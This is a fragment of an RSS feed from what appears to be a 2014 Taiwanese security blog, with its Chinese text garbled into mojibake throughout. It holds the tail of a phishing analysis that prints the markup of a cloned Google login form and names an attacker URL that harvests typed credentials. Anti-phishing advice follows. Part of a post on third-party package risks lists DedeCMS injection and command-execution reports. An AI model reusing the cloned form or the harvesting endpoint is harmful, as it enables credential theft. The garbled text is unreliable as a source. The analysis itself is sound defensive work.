  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GALX&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6UMbQQmFgwI&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;continue&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://mail.google.com/mail/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;service&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mail&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hl&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;scc&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sacu&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_utf8&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_utf8&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;â˜ƒ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bgresponse&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bgresponse&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;js_disabled&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pstMsg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pstMsg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dnConn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dnConn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkConnection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkConnection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;youtube:424:1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkedDomains&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkedDomains&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;youtube&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden-label&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Email&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;spellcheck=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden-label&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Passwd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signIn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;signIn&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rc-button rc-button-submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sign in&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ç™¼ç¾äº†å—ï¼Ÿå…¶ä¸­ form çš„ action æ¬„ä½è¢«å–ä»£æˆã€Œ&lt;strong&gt;http://cantonfair.a78.org/yahoo/post.php&lt;/strong&gt;ã€ï¼Œè€Œé€™å€‹é é¢æœƒç›´æ¥æ¥æ”¶å—å®³è€…è¼¸å…¥çš„å¸³è™Ÿå¯†ç¢¼ï¼Œä¸¦ä¸”è‡ªå‹•è·³è½‰åˆ°çœŸæ­£çš„ Google ç™»å…¥é é¢ã€‚æ”»æ“Šè€…å¾ a78.org é€™å€‹ç¶²ç«™ä¸­ç›´æ¥å–å¾—æ‰€æœ‰è¢«é§­çš„äººè¼¸å…¥çš„å¸³è™Ÿå¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹å¾ˆç°¡å–®ã€å…¸å‹ã€åˆæ˜“è¢«ç™¼ç¾çš„é‡£é­šæ¡ˆä¾‹ã€‚å¦‚æœä¸€æ™‚ä¸å¯Ÿä¸å°å¿ƒè¼¸å…¥äº†å¸³è™Ÿå¯†ç¢¼ï¼Œä¸‹æ¬¡å¸³è™Ÿè¢«ç›œçš„å°±æ˜¯è‡ªå·±ã€‚å»ºè­°å¤§å®¶åœ¨æ”¶å–ä¿¡ä»¶çš„æ™‚å€™éµå¾ªå¹¾å¤§åŸå‰‡ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¸éš¨ä¾¿é–‹å•Ÿé™„åŠ æª”æ¡ˆï¼šé™„ä»¶å¸¸å¤¾å¸¶æƒ¡æ„ç¨‹å¼ã€åŸ·è¡Œæª”ã€æƒ¡æ„æ–‡ä»¶ã€é‡£é­šç¶²é ç­‰ï¼Œåˆ‡å‹¿éš¨ä¾¿é–‹å•Ÿã€‚å¯ä½¿ç”¨ Google Docs é–‹å•Ÿé™„ä»¶æ–‡ä»¶é˜²æ­¢æƒ¡æ„æ–‡ä»¶æ”»æ“Š Adobe PDF Readerã€Microsoft Office ç­‰ç¨‹å¼ã€‚æ›´å¸¸æœ‰æŠŠæƒ¡æ„ç¨‹å¼åŠ å¯†å£“ç¸®å¾Œå¯„å‡ºï¼Œåœ¨ä¿¡ä¸­é™„ä¸Šå¯†ç¢¼ï¼Œå€Ÿæ­¤è¦é¿é˜²æ¯’è»Ÿé«”çš„åµæ¸¬ï¼Œä¸å¯ä¸æ…ã€‚&lt;/li&gt;
  &lt;li&gt;æ³¨æ„ä¿¡ä»¶ä¸­çš„è¶…é€£çµ URLï¼šé‡£é­šä¿¡ä»¶å¸¸åœ¨è¶…é€£çµä¸­ä½¿ç”¨æƒ¡æ„ç¶²ç«™çš„ URLï¼Œåœ¨é»é¸ä¹‹å‰å‹™å¿…ä»”ç´°æª¢æŸ¥ï¼Œæ›´è¦å°å¿ƒã€ŒGoog&lt;strong&gt;l&lt;/strong&gt;eã€åŠã€ŒGoog&lt;strong&gt;1&lt;/strong&gt;eã€ä¹‹é¡çš„è‹±æ–‡æ•¸å­—å·®ç•°ã€‚&lt;/li&gt;
  &lt;li&gt;æ³¨æ„ä¿¡ä»¶ä¸­çš„èªæ°£ï¼šæœ‰çš„æ™‚å€™æ”»æ“Šè€…ä»¿å†’ä½ èº«é‚Šå¯ä¿¡ä»»çš„äººå¯„ä¿¡çµ¦ä½ ï¼Œä½†æ˜¯èªæ°£ã€ç”¨è©è¦éå¸¸ç²¾æº–ã€‚å¦‚æœå‡ºç¾äº†ã€Œ&lt;strong&gt;å°Šæ•¬çš„ç”¨æˆ¶æ‚¨å¥½&lt;/strong&gt;ã€ä½ å°±æœƒç™¼ç¾é€™å€‹æ‡‰è©²ä¸å¤ªåƒæ˜¯å°ç£æœ¬åœŸçš„ä¿¡ä»¶ç”¨èªã€‚&lt;/li&gt;
  &lt;li&gt;ä¸åœ¨ä¿¡ä»¶ä¸­å¤¾å¸¶æ©Ÿæ•è³‡æ–™ï¼šä¿¡ä»¶æ˜¯ä¸å®‰å…¨çš„ï¼Œåˆ‡å‹¿åœ¨ä¿¡ä¸­æåˆ°å¸³è™Ÿã€å¯†ç¢¼ã€å€‹è³‡ç­‰æ©Ÿå¯†è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;ä¸å›æ‡‰é™Œç”Ÿéƒµä»¶ï¼šéƒµä»¶ä¸­æœƒå¤¾å¸¶è‡ªå·±çš„ IP ä½å€ï¼Œå›æ‡‰ä¿¡ä»¶å¯èƒ½è®“æ”»æ“Šè€…å¾—åˆ°é€™äº›è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨å®‰å…¨çš„éƒµä»¶è»Ÿé«”ï¼šè‹¥ä½¿ç”¨å®‰å…¨çš„éƒµä»¶è»Ÿé«”ã€å¹³å°ï¼Œä¾‹å¦‚ Gmailï¼Œé‡åˆ°æƒ¡æ„éƒµä»¶æ™‚ï¼Œæœƒå³æ™‚é˜»æ“‹ä¸¦ä¸”è­¦å‘Šç”¨æˆ¶ã€‚å¦‚æœä½¿ç”¨è‡ªå·±çš„éƒµä»¶è»Ÿé«”ï¼Œå°±è¦ç‰¹åˆ¥æ³¨æ„é‡£é­šç­‰æ”»æ“Šã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é›»å­éƒµä»¶çš„æ”»æ“Šå·²ç¶“æˆç‚ºæ»²é€æ”»æ“Šä¸»è¦çš„æ‰‹æ³•ä¹‹ä¸€ï¼Œä¸å°‘åœ‹éš›è³‡å®‰äº‹ä»¶éƒ½æ˜¯è‚‡å› æ–¼æƒ¡æ„éƒµä»¶ã€‚ä¾‹å¦‚ 2013 å¹´éŸ“åœ‹ DarkSeoul äº‹ä»¶ï¼Œä»¥åŠç«„æ”¹äº¤æ˜“åŒ¯æ¬¾è³‡æ–™éƒµä»¶è©å–åŒ¯æ¬¾ç­‰ã€‚èº«ç‚ºç›®æ¨™çš„æˆ‘å€‘æ›´è¦æ™‚æ™‚æ³¨æ„ä½¿ç”¨é›»å­éƒµä»¶æ™‚çš„å®‰å…¨äº‹é …ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam/</link>
                <guid>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam</guid>
                <pubDate>Mon, 31 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ‰€è¦æ“”è² çš„è³‡å®‰é¢¨éšª</title>
                <description>&lt;p&gt;ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶ç¯€çœé–‹ç™¼æ™‚é–“ï¼Œå·²ç¶“æ˜¯æ•´å€‹è³‡è¨Šç”¢æ¥­çš„æ…£ä¾‹ã€‚ä½†æ˜¯å¾ˆå¤šç®¡ç†è€…å¯èƒ½ä¸çŸ¥é“ï¼Œä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶åˆ°åº•éœ€è¦æ“”è² å¤šå¤§çš„è³‡å®‰é¢¨éšªã€‚ä½ ç¢ºå®šä½ ç”¨çš„å¥—ä»¶æ˜¯å®‰å…¨ç„¡è™çš„å—ï¼Ÿæ˜¯å¦æœ‰ç¶“éåš´è¬¹çš„å®‰å…¨æ¸¬è©¦ï¼Ÿè‹¥æœ‰å®‰å…¨æ¼æ´å¼•çˆ†ï¼Œæ˜¯å¦æœ‰å» å•†å¯ä»¥è² è²¬ç¶­è­·ä¿®è£œï¼Ÿå» å•†é–‹ç™¼çš„ç¨‹å¼ç¢¼å“è³ªæ˜¯å¦ç©©å®šï¼Ÿé€™äº›éƒ½æ˜¯åœ¨ä½¿ç”¨ä¹‹å‰å¿…é ˆè¦è€ƒæ…®çš„ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨æœå‹™çœ¾å¤šå®¢æˆ¶ä¹‹å¾Œï¼Œæˆ‘å€‘æ·±çŸ¥é€™äº›å•é¡Œçš„åš´é‡æ€§ã€‚ä»¥ä¸‹æˆ‘å€‘å°‡å°±å¹¾å€‹ç¶“å…¸çš„æ¡ˆä¾‹ä¾†èªªæ˜ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ‰€è¦æ“”è² çš„é¢¨éšªï¼Œä¸¦ä¸”åˆ†äº«æˆ‘å€‘å°æ–¼ç¬¬ä¸‰æ–¹å¥—ä»¶çš„å®‰å…¨å»ºè­°ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ç¨‹å¼ç¢¼çš„å®‰å…¨æ€§&quot;&gt;ç¨‹å¼ç¢¼çš„å®‰å…¨æ€§ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç¨‹å¼ç¢¼çš„å“è³ªç›´æ¥æ±ºå®šäº†ç³»çµ±çš„å®‰å…¨æ€§ã€‚å¦‚æœä¸€å€‹å¥—ä»¶æœ‰ä»¥ä¸‹å¹¾é»å› ç´ ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¨‹å¼é–‹ç™¼å·²ä¹…é›£ä»¥ä¿®æ”¹&lt;/li&gt;
  &lt;li&gt;é–‹ç™¼äººå“¡ç„¡å®‰å…¨è§€å¿µ&lt;/li&gt;
  &lt;li&gt;å¤§é‡æ•´åˆå¤–éƒ¨å¥—ä»¶ï¼Œç„¡æ³•æ§ç®¡æ¯å€‹å¥—ä»¶å®‰å…¨&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¯èƒ½å°±å› ç‚ºç¨‹å¼ç¢¼é›£ä»¥ä¿®æ”¹ï¼Œå½¢æˆæ¼æ´ç™¾å‡ºçš„ç¨‹å¼æ¶æ§‹ã€‚è‹¥æ˜¯ä¹‹å¾Œé™¸çºŒç™¼ç”Ÿå®‰å…¨å•é¡Œï¼Œå„˜ç®¡ä¸æ–·çš„ä¿®è£œæ¼æ´ï¼Œä½†å»æœƒå› ç‚ºç¨‹å¼ç¢¼çš„è¨­è¨ˆã€æ¶æ§‹ç­‰å› ç´ ï¼Œé€ æˆæ—¥å¾Œä¾èˆŠé™¸çºŒæœ‰å®‰å…¨ç–‘æ…®ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹èªªæ˜dedecms&quot;&gt;æ¡ˆä¾‹èªªæ˜ï¼šDedeCMS&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.dedecms.com/&quot;&gt;DedeCMS&lt;/a&gt; æ˜¯çŸ¥åçš„å…§å®¹ç®¡ç†ç³»çµ±ï¼Œä¸å°‘å…¬å¸æ‹¿æ­¤å¥—ä»¶æ¶è¨­ç¶²ç«™ã€éƒ¨è½æ ¼ç­‰ã€‚ä½†åœ¨é€™å¹¾å€‹æœˆï¼Œåœ¨ã€Œ&lt;a href=&quot;http://wooyun.org&quot;&gt;çƒé›²å¹³å°&lt;/a&gt;ã€ä¸Šé™¸çºŒæœ‰äººæ­éœ² DedeCMS çš„æ¼æ´ã€‚åŒ…æ‹¬å¤§é‡å„ç¨® SQL Injectionã€Cross-Site Scripting å¼±é»ç­‰ç­‰ï¼Œç”šè‡³é‚„åŒ…æ‹¬ Command Execution å•é¡Œã€‚å¦‚æœæ²’æœ‰å³æ™‚ä¿®æ­£é€™äº›å•é¡Œï¼Œå°å‰‡é€ æˆç”¨æˆ¶å¸³è™Ÿè¢«ç›œï¼Œå¤§å‰‡é€ æˆæ•´å°ä¸»æ©Ÿè¢«å…¥ä¾µï¼Œå–å¾—ä½œæ¥­ç³»çµ±æ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot; alt=&quot;çƒé›²æ¼æ´å ±å‘Šå¹³å°&quot; title=&quot;çƒé›²æ¼æ´å ±å‘Šå¹³å°&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä»€éº¼ç³»çµ±æ²’è¢«æ‰¾åˆ°æ¼æ´éå‘¢ï¼Ÿæœ‰é‚£éº¼åš´é‡å—ï¼Ÿä½†è©²ç³»çµ±å·²ç¶“ä¸åªä¸€æ¬¡å‡ºç¾é‡å¤§æ¼æ´å°è‡´ä¼æ¥­é­åˆ°å…¥ä¾µï¼Œåœ¨ä»Šå¹´ä¸€äºŒæœˆä»½æ›´æ˜¯é­æ­éœ²å¤šé”åæ•¸å€‹é«˜é¢¨éšª SQL Injection è³‡æ–™åº«æ³¨å…¥æ¼æ´ã€‚æ­¤ç¾è±¡å‡¸é¡¯è©²å¥—ä»¶çš„è¨­è¨ˆä¸¦æœªç¶“éå®‰å…¨æ¸¬è©¦ï¼Œä¸¦ä¸”æ¡ç”¨ä¸å®‰å…¨çš„ç¨‹å¼æ’°å¯«æ–¹å¼ï¼Œæœªä¾†å¯èƒ½æœƒæœ‰æ›´å¤šéš±å«çš„æ¼æ´é‡‹å‡ºã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot; alt=&quot;dedecmsæ¼æ´æ–¼çƒé›²å¹³å°&quot; title=&quot;dedecmsæ¼æ´æ–¼çƒé›²å¹³å°&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å¹³å°ä¸­æœå°‹é—œéµå­—ã€ŒDedeCMSã€ï¼Œæœƒç™¼ç¾æ¼æ´æå ±çš„æ¬¡æ•¸ç›¸ç•¶å¤šï¼Œåœ¨æ¼æ´çš„è©•è«–ä¸­ä¹Ÿæœ‰ä¸å°‘æŠ€è¡“äººå“¡é€²è¡Œè¨è«–ã€‚ä½†æ›´å¤šçš„ç–‘æƒ‘æ˜¯ç‚ºä»€éº¼ DedeCMS æœƒä¸€å†çš„ç™¼ç”Ÿè³‡å®‰å•é¡Œã€‚ä¾‹å¦‚ä»¥ä¸‹æ¼æ´ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-052010&quot;&gt;DedecmsæŸå‘½ä»¤åŸ·è¡Œæ¼æ´&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051950&quot;&gt;DedeCMSå…¨ç‰ˆæœ¬é€šæ®ºSQLæ³¨å…¥(çœŸæ­£çš„ç„¡ä»»ä½•é™åˆ¶é™„å®˜æ–¹æ¸¬è©¦çµæœ)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051889&quot;&gt;DedeCMSå…¨ç‰ˆæœ¬é€šæ®ºSQLæ³¨å…¥(ç„¡ä»»ä½•é™åˆ¶)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-052792&quot;&gt;DedecmsæŸå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆç»­ï¼‰&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot; alt=&quot;dedecmsæ¼æ´æ–¼çƒé›²å¹³å°&quot; title=&quot;dedecmsæ¼æ´æ–¼çƒé›²å¹³å°&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;è€Œæ–¼å¦ä¸€å€‹ã€Œ&lt;a href=&quot;http://sebug.net&quot;&gt;Sebug å®‰å…¨æ¼æ´ä¿¡æ¯åº«&lt;/a&gt;ã€ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸å°‘ DedeCMS çš„è¹¤å½±ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot; alt=&quot;sebugå®‰å…¨æ¼æ´ä¿¡æ¯åº«&quot; title=&quot;sebugå®‰å…¨æ¼æ´ä¿¡æ¯åº«&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœå®˜æ–¹åœ¨ç¬¬ä¸€æ™‚é–“å°±èƒ½æ¥ç²é€šå ±ã€äº†è§£å•é¡Œä¸¦ä¿®æ­£è§£æ±ºï¼Œæä¾›æ›´æ–°ç¨‹å¼çµ¦å®¢æˆ¶æ›´æ–°ï¼Œé‚£å®‰å…¨çš„é¢¨éšªæœƒå°äº›ã€‚ä½†åœ¨å®˜æ–¹å°šæœªé‡‹å‡ºæ›´æ–°çš„é€™æ®µæ™‚é–“ï¼Œç¶²ç«™å°‡å®Œå…¨çš„æš´éœ²åœ¨é¢¨éšªç•¶ä¸­ã€‚æœ‰å¿ƒäººå£«çœ‹åˆ°å¥—ä»¶çš„æ¼æ´é™¸çºŒè¢«æ­éœ²ï¼Œä¹Ÿæœƒæ›´æœ‰èˆˆè¶£å°‹æ‰¾ä½¿ç”¨è©²å¥—ä»¶çš„ç¶²ç«™æ”»æ“Šã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹èªªæ˜joomla&quot;&gt;æ¡ˆä¾‹èªªæ˜ï¼šJoomla!&lt;/h3&gt;

